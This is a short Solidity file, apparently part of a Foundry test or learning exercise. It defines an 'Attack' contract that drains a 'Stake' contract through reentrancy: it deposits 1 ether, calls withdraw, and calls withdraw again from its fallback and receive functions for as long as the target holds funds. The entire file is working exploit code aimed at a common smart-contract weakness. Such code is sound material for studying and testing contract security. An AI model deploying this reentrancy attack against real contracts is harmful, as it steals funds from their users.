// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Test, console2} from "forge-std/Test.sol";

interface Stake {
    function deposit() external payable;
    function withdraw() external;
    function getBalance() external view returns (uint256);
}

error ValueTooLow();

contract Attack {
    Stake public stake;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _stakeAddress) {
        stake = Stake(_stakeAddress);
    }

    function attack() external payable {
        if(msg.value < AMOUNT) revert ValueTooLow();
        stake.deposit{value: AMOUNT}();
        stake.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    // Fallback function to be executed when Stake sends Ether to this contract
    fallback() external payable {
        if (address(stake).balance >= AMOUNT) {
            stake.withdraw();
        }
    }

    receive() external payable {
        if (address(stake).balance >= AMOUNT) {
            stake.withdraw();
        }
    }
}
